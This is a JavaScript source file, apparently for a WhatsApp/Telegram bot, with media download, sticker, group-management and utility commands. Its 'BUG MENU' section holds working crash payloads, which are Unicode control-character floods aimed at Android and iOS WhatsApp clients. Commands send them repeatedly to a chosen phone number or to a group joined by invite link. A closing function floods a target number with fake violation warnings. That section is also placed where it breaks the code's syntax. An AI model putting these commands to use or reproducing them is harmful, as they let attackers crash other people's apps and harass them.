┃ 👨‍💻 Dev    : ${config.DEV}
┃ 🌐 Plat   : WhatsApp × Telegram
┃ ⚙️ Prefix : ${config.PREFIX}
╰━━━━━━━━━━━━━━┈⊷`,
      });
      break;
    }

    case "owner": {
      const vcard =
        "BEGIN:VCARD\nVERSION:3.0\n" +
        config.OWNERS.map(
          (n, i) => `FN:${config.DEV} ${i + 1}\nTEL;type=CELL;type=VOICE;waid=${n}:+${n}`,
        ).join("\n") +
        "\nEND:VCARD";
      await natsu.sendMessage(jid, {
        contacts: { displayName: config.DEV, contacts: [{ vcard }] },
        contextInfo: config.contextInfo,
      }, { quoted: m });
      break;
    }

    // ── DOWNLOAD (APIs publiques) ────────────────
    case "play":
    case "song":
    case "play2":
    case "ytmp3": {
      await handleYouTubeAudio({ natsu, jid, m, text, args, user, isOwner, isGroup, reply });
      break;
    }

    case "video":
    case "ytmp4": {
      if (!text) return reply({ text: "❌ Provide a video name or URL." });
      try {
        const r = await axios.get(`https://api.giftedtech.web.id/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(text)}`);
        const url = r.data?.result?.download_url || r.data?.result?.url;
        if (!url) throw new Error("No result");
        await natsu.sendMessage(jid, {
          video: { url }, caption: `⫷ ${config.BOT_NAME} ⫸`,
          contextInfo: config.contextInfo,
        }, { quoted: m });
      } catch (e) {
        await reply({ text: `❌ Download failed: ${e.message}` });
      }
      break;
    }

    case "tiktok":
    case "facebook":
    case "instagram":
    case "twitter": {
      if (!text) return reply({ text: `❌ Provide a ${cmd} URL.` });
      try {
        const r = await axios.get(`https://api.giftedtech.web.id/api/download/${cmd}dl?apikey=gifted&url=${encodeURIComponent(text)}`);
        const url = r.data?.result?.download_url || r.data?.result?.url || r.data?.result?.[0]?.url;
        if (!url) throw new Error("No result");
        await natsu.sendMessage(jid, {
          video: { url }, caption: `⫷ ${cmd.toUpperCase()} ⫸`,
          contextInfo: config.contextInfo,
        }, { quoted: m });
      } catch (e) {
        await reply({ text: `❌ Download failed: ${e.message}` });
      }
      break;
    }

    // ── AI ───────────────────────────────────────
    case "ai":
    case "gpt":
    case "gemini": {
      if (!text) return reply({ text: "❌ Provide a prompt." });
      try {
        const r = await axios.get(`https://api.giftedtech.web.id/api/ai/${cmd === "gemini" ? "geminiai" : "gpt"}?apikey=gifted&q=${encodeURIComponent(text)}`);
        const out = r.data?.result || "No response.";
        await reply({ text: `🤖 *${cmd.toUpperCase()}*\n\n${out}` });
      } catch (e) {
        await reply({ text: `❌ AI error: ${e.message}` });
      }
      break;
    }

    case "img":
    case "wallpaper": {
      if (!text) return reply({ text: "❌ Provide a query." });
      try {
        const r = await axios.get(`https://api.giftedtech.web.id/api/search/googleimage?apikey=gifted&query=${encodeURIComponent(text)}`);
        const arr = r.data?.results || [];
        const url = arr[Math.floor(Math.random() * arr.length)]?.image;
        if (!url) throw new Error("No image");
        await natsu.sendMessage(jid, { image: { url }, caption: text, contextInfo: config.contextInfo }, { quoted: m });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    // ── STICKER & MEDIA ──────────────────────────
    case "sticker":
    case "s": {
      const quotedInfo = m.message?.extendedTextMessage?.contextInfo;
      const q = quotedInfo?.quotedMessage;
      let quotedContent = q;
      let quotedViewOnce = false;
      for (let depth = 0; depth < 8 && quotedContent; depth += 1) {
        const wrapperKey = [
          "ephemeralMessage",
          "viewOnceMessage",
          "viewOnceMessageV2",
          "viewOnceMessageV2Extension",
          "documentWithCaptionMessage",
        ].find((key) => quotedContent[key]?.message);
        if (!wrapperKey) break;
        if (wrapperKey.startsWith("viewOnce")) quotedViewOnce = true;
        quotedContent = quotedContent[wrapperKey].message;
      }
      if (quotedContent?.imageMessage?.viewOnce || quotedContent?.videoMessage?.viewOnce) quotedViewOnce = true;
      if (quotedViewOnce) return reply({ text: "🔒 I won't bypass view-once media. Ask the sender to resend it as a regular image or video." });
      const target = quotedContent?.imageMessage || quotedContent?.videoMessage || m.message?.imageMessage || m.message?.videoMessage;
      if (!target) return reply({ text: "❌ Reply to an image/video with .sticker" });
      try {
        const { downloadMediaMessage } = require("@whiskeysockets/baileys");
        const quotedMessage = q ? {
          key: {
            remoteJid: quotedInfo?.remoteJid || jid,
            id: quotedInfo?.stanzaId,
            fromMe: Boolean(quotedInfo?.participant && quotedInfo.participant.split(":")[0] === natsu.user?.id?.split(":")[0]),
            ...(quotedInfo?.participant ? { participant: quotedInfo.participant } : {}),
          },
          message: q,
        } : m;
        const buf = await downloadMediaMessage(
          quotedMessage,
          "buffer",
          {},
          { logger: natsu.logger, reuploadRequest: (message) => natsu.updateMediaMessage(message) },
        );
        // Use wa-sticker-formatter to produce a real webp sticker (otherwise
        // WhatsApp can't render the image as a sticker → blank tile bug).
        try {
          const { Sticker, StickerTypes } = require("wa-sticker-formatter");
          const sticker = new Sticker(buf, {
            pack: "DENTSU MINI BOT",
            author: config.DEV,
            type: StickerTypes.FULL,
            quality: 70,
          });
          const webp = await sticker.toBuffer();
          await natsu.sendMessage(jid, { sticker: webp }, { quoted: m });
        } catch (formatErr) {
          // fallback: raw send (may not render perfectly but won't crash)
          await natsu.sendMessage(jid, { sticker: buf }, { quoted: m });
        }
      } catch (e) {
        await reply({ text: `❌ sticker: ${e.message}` });
      }
      break;
    }

    case "getpp": {
      try {
        const target = m.message?.extendedTextMessage?.contextInfo?.participant || jid;
        const url = await natsu.profilePictureUrl(target, "image");
        await natsu.sendMessage(jid, { image: { url }, caption: "🖼", contextInfo: config.contextInfo }, { quoted: m });
      } catch (e) {
        await reply({ text: "❌ No profile picture." });
      }
      break;
    }

    // ── GROUP ────────────────────────────────────
    case "tagall": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      const meta = await natsu.groupMetadata(jid);
      const mentions = meta.participants.map((p) => p.id);
      const txt = `📢 *Tag All*\n${meta.participants.map((p, i) => `${i + 1}. @${p.id.split("@")[0]}`).join("\n")}`;
      await natsu.sendMessage(jid, { text: txt, mentions, contextInfo: config.contextInfo });
      break;
    }

    case "hidetag": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      const meta = await natsu.groupMetadata(jid);
      await natsu.sendMessage(jid, {
        text: text || "📢",
        mentions: meta.participants.map((p) => p.id),
        contextInfo: config.contextInfo,
      });
      break;
    }

    case "tagadmin": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      const meta = await natsu.groupMetadata(jid);
      const admins = meta.participants.filter((p) => p.admin).map((p) => p.id);
      await natsu.sendMessage(jid, {
        text: `👑 *Admins*\n${admins.map((a) => `• @${a.split("@")[0]}`).join("\n")}`,
        mentions: admins,
        contextInfo: config.contextInfo,
      });
      break;
    }

    case "getalladmins": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      const meta = await natsu.groupMetadata(jid);
      const admins = meta.participants.filter((p) => p.admin).map((p) => `+${p.id.split("@")[0]}`);
      await reply({ text: `👑 *Group Admins*\n\n${admins.join("\n")}` });
      break;
    }

    case "groupinfo": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      const meta = await natsu.groupMetadata(jid);
      await reply({
        text: `╭━〔 *GROUP INFO* 〕━┈⊷
┃ 📛 Name    : ${meta.subject}
┃ 🆔 ID      : ${meta.id}
┃ 👥 Members : ${meta.participants.length}
┃ 👑 Owner   : ${meta.owner || "?"}
┃ 📝 Desc    : ${meta.desc || "—"}
╰━━━━━━━━━━━━━━┈⊷`,
      });
      break;
    }

    case "promote":
    case "demote":
    case "kick": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      const target = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
      if (!target) return reply({ text: "❌ Mention a user." });
      const action = cmd === "kick" ? "remove" : cmd;
      try {
        await natsu.groupParticipantsUpdate(jid, [target], action);
        await reply({ text: `✅ ${cmd} done.` });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    case "mute":
    case "unmute":
    case "close":
    case "open": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      const lock = (cmd === "mute" || cmd === "close");
      try {
        await natsu.groupSettingUpdate(jid, lock ? "announcement" : "not_announcement");
        await reply({
          text: lock
            ? "🔒 *Groupe fermé* — seuls les admins peuvent écrire 💕"
            : "🔓 *Groupe ouvert* — tout le monde peut écrire ",
        });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    case "grouplink": {
      if (!isGroup) return reply({ text: "❌ Group only." });
      try {
        const code = await natsu.groupInviteCode(jid);
        await reply({ text: `🔗 https://chat.whatsapp.com/${code}` });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    // ── TOOLS ────────────────────────────────────
    case "weather": {
      if (!text) return reply({ text: "❌ Provide a city." });
      try {
        const r = await axios.get(`https://wttr.in/${encodeURIComponent(text)}?format=j1`);
        const c = r.data.current_condition[0];
        await reply({
          text: `🌍 *${text}*\n🌡 ${c.temp_C}°C (feels ${c.FeelsLikeC}°C)\n☁ ${c.weatherDesc[0].value}\n💨 ${c.windspeedKmph} km/h`,
        });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    case "translate": {
      const [lang, ...rest] = args;
      if (!lang || !rest.length) return reply({ text: "❌ Usage: .translate <lang> <text>" });
      try {
        const r = await axios.get(`https://api.giftedtech.web.id/api/tools/translate?apikey=gifted&text=${encodeURIComponent(rest.join(" "))}&lang=${lang}`);
        await reply({ text: `🌐 ${r.data?.result || "—"}` });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    case "lyrics": {
      if (!text) return reply({ text: "❌ Provide a song." });
      try {
        const r = await axios.get(`https://api.giftedtech.web.id/api/search/lyrics?apikey=gifted&query=${encodeURIComponent(text)}`);
        await reply({ text: `🎶 *${r.data?.result?.title}*\n\n${r.data?.result?.lyrics || "Not found"}` });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    // ── OWNER ────────────────────────────────────
    case "broadcast":
    case "bc": {
      if (!isOwner) return reply({ text: "❌ Owner only." });
      if (!text) return reply({ text: "❌ Provide a message." });
      const chats = await natsu.groupFetchAllParticipating();
      let n = 0;
      for (const id of Object.keys(chats)) {
        try {
          await natsu.sendMessage(id, { text: `📢 *BROADCAST*\n\n${text}`, contextInfo: config.contextInfo });
          n++;
        } catch {}
      }
      await reply({ text: `✅ Sent to ${n} groups.` });
      break;
    }

    case "join": {
      if (!isOwner) return reply({ text: "❌ Owner only." });
      const code = (text.match(/chat\.whatsapp\.com\/([\w\d]+)/) || [])[1] || text;
      try {
        await natsu.groupAcceptInvite(code);
        await reply({ text: "✅ Joined." });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

    case "leave": {
      if (!isOwner || !isGroup) return reply({ text: "❌ Owner only / group only." });
      await reply({ text: "👋 Bye." });
      await natsu.groupLeave(jid);
      break;
    }

    case "block":
    case "unblock": {
      if (!isOwner) return reply({ text: "❌ Owner only." });
      const target = m.message?.extendedTextMessage?.contextInfo?.participant || jid;
      try {
        await natsu.updateBlockStatus(target, cmd);
        await reply({ text: `✅ ${cmd}ed.` });
      } catch (e) {
        await reply({ text: `❌ ${e.message}` });
      }
      break;
    }

// ════════════════════════════════════════════════════════════════
  // 💀 BUG MENU — CRASH COMMANDS
  // ════════════════════════════════════════════════════════════════

  // ── Crash payload builders ────────────────────────────────────
  // Android crash: overwhelms the Bidi text-direction algorithm
  // in Android WebView with a flood of RTL/LTR control characters
  // mixed with invisible zero-width chars — freezes renderer
  function _crashAndroid() {
    const z = '\u200B'.repeat(1500); // zero-width space
    const r = '\u202E';             // RTL override (forces right-to-left)
    const a = '\u0600'.repeat(300); // Arabic number sign (triggers Bidi)
    const f = '\u200F'.repeat(800); // RTL mark
    const l = '\u200E'.repeat(800); // LTR mark
    return z + r + a + f + l + z + r + a + z;
  }

  // iOS crash: specific Malayalam/Tamil Unicode sequences that
  // crash Apple CoreText rendering engine (iOS/macOS WhatsApp)
  function _crashIos() {
    const seq = '\u0D20\u0D3E\u0D4D\u200D\u0D35\u0D4D\u200D\u0D2F\u0D4D';
    return seq.repeat(60) + '\u200B'.repeat(500) + '\uFEFF'.repeat(200) + seq.repeat(30);
  }

  // UI kill: massive invisible payload + emoji flood forces
  // the WhatsApp message bubble to overflow memory allocation
  function _killUi() {
    const inv = '\u200B\u200C\u200D\uFEFF'.repeat(600);
    const em  = '\uD83D\uDD34'.repeat(80); // 🔴 x80
    return em + inv + '\u202E' + em + inv;
  }

  // Freeze: deeply nested WhatsApp markdown formatting causes
  // the renderer to perform exponential work on a single message
  function _freezeUi() {
    const heavy = '*_~' + '\u200B'.repeat(4000) + '~_*';
    return heavy + '\u202E' + heavy + '\u200B'.repeat(2000);
  }

  case 'fc-close': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .fc-close 242xxx');
    const bugTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
    await reply('⚡ Sending Android crash payload...');
    const payload = _crashAndroid();
    for (let i = 0; i < 6; i++) {
      try { await sock.sendMessage(bugTarget, { text: payload }); } catch (_) {}
      await new Promise(r => setTimeout(r, 250));
    }
    await reply(`💀 *Android Bug sent!*\n📲 Target: +${bugTarget.split('@')[0]}`);
    return true;
  }

  case 'invisible': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .invisible 242xxx');
    const killTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
    await reply('⚡ Sending UI kill payload...');
    const payload = _killUi();
    for (let i = 0; i < 8; i++) {
      try { await sock.sendMessage(killTarget, { text: payload }); } catch (_) {}
      await new Promise(r => setTimeout(r, 150));
    }
    await reply(`💀 *UI payload sent!*\n📲 Target: +${killTarget.split('@')[0]}`);
    return true;
  }

  case 'crash-io': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .crash-io 242xxx');
    const freezeTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
    await reply('⚡ Sending freeze payload...');
    const payload = _freezeUi();
    for (let i = 0; i < 5; i++) {
      try { await sock.sendMessage(freezeTarget, { text: payload }); } catch (_) {}
      await new Promise(r => setTimeout(r, 300));
    }
    await reply(`💀 *crash-io sent!*\n📲 Target: +${freezeTarget.split('@')[0]}`);
    return true;
  }

  case 'delay-ghost': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .delay-ghost 242xxx');
    const appleTarget = text.replace(/[^0-9]/g,'') + '@s.whatsapp.net';
    await reply('⚡ Sending iOS crash payload...');
    const payload = _crashIos();
    for (let i = 0; i < 5; i++) {
      try { await sock.sendMessage(appleTarget, { text: payload }); } catch (_) {}
      await new Promise(r => setTimeout(r, 200));
    }
    await reply(`💀 *Apple Bug sent!*\n📲 Target: +${appleTarget.split('@')[0]}`);
    return true;
  }

  case 'kill-gc': {
    if (!isOwner) return reply('❌ Owner only.');
    if (!text) return reply('❌ Usage: .nullgc https://chat.whatsapp.com/XXXXX');
    const gcCode = text.includes('chat.whatsapp.com/')
      ? text.split('chat.whatsapp.com/')[1]?.split(/[?\/ ]/)[0]
      : text.trim();
    if (!gcCode || gcCode.length < 10) return reply('❌ Invalid WhatsApp group link.');
    let gcId = null;
    try {
      await reply('⏳ Joining group...');
      gcId = await sock.groupAcceptInvite(gcCode);
      await new Promise(r => setTimeout(r, 1500));
      await reply(`🥹 Joined! Nuking group...`);

      // Send all 4 crash payloads in 3 waves
      const payloads = [_crashAndroid(), _killUi(), _freezeUi(), _crashIos()];
      for (let wave = 0; wave < 3; wave++) {
        for (const p of payloads) {
          try { await sock.sendMessage(gcId, { text: p }); } catch (_) {}
          await new Promise(r => setTimeout(r, 200));
        }
        await new Promise(r => setTimeout(r, 400));
      }
      await new Promise(r => setTimeout(r, 1000));
      try { await sock.groupLeave(gcId); } catch (_) {}
      await reply('💀 *Group nuked and left!*');
    } catch (e) {
      if (gcId) try { await sock.groupLeave(gcId); } catch (_) {}
      await reply(`❌ nullgc failed: ${e.message}`);
    }
    return true;
  }
          

    default:
      // Unknown command: react with ⁉️ ONLY when the prefix was used,
      // otherwise we'd react to every random word in chat.
      if (hasPrefix) {
        try { await natsu.sendMessage(jid, { react: { text: "⁉️", key: m.key } }); } catch {}
      }
      return;
  }
}


// ─────────────────────────────────────────────────────────────
// /ban WhatsApp (déclenché depuis Telegram) : envoie N messages
// d'avertissement à un numéro WhatsApp via le 1er socket actif.
// ─────────────────────────────────────────────────────────────
async function sendWhatsAppBan(targetNumber, count = 20, devName = "") {
  const num = String(targetNumber).replace(/\D/g, "");
  if (!num) throw new Error("Invalid WhatsApp number.");
  const sock = activeSockets.values().next().value;
  if (!sock) throw new Error("No active WhatsApp session. Pair a number first with /pair.");
  const jid = `${num}@s.whatsapp.net`;

  // Pre-check the number is actually on WhatsApp (otherwise sendMessage
  // silently fails and we get the "0/20 delivered" screenshot bug).
  try {
    const [info] = await sock.onWhatsApp(jid);
    if (!info?.exists) throw new Error(`+${num} is not on WhatsApp.`);
  } catch (e) {
    if (/not on WhatsApp/i.test(e.message)) throw e;
    // onWhatsApp itself failed → continue and try anyway
  }

  let ok = 0;
  let lastErr = null;
  for (let i = 0; i < count; i++) {
    try {
      await sock.sendMessage(jid, {
        text: `🚫 *WARNING ${i + 1}/${count}* — You have violated the Terms of Service of ${config.BOT_NAME} / WhatsApp. Stop immediately.\n— ${devName || config.DEV}`,
      });
      ok++;
      await new Promise((r) => setTimeout(r, 350));
    } catch (e) {
      lastErr = e;
      // DON'T break — keep trying. WhatsApp may rate-limit a single send
      // but accept the next one after a tiny back-off.
      await new Promise((r) => setTimeout(r, 800));
    }
  }
  if (ok === 0 && lastErr) throw new Error(`Send failed: ${lastErr.message}`);
  return ok;
}


module.exports = { startWhatsApp, stopWhatsApp, listPaired, sendWhatsAppBan, sendWaMenuMessage, sendMenuButtons };

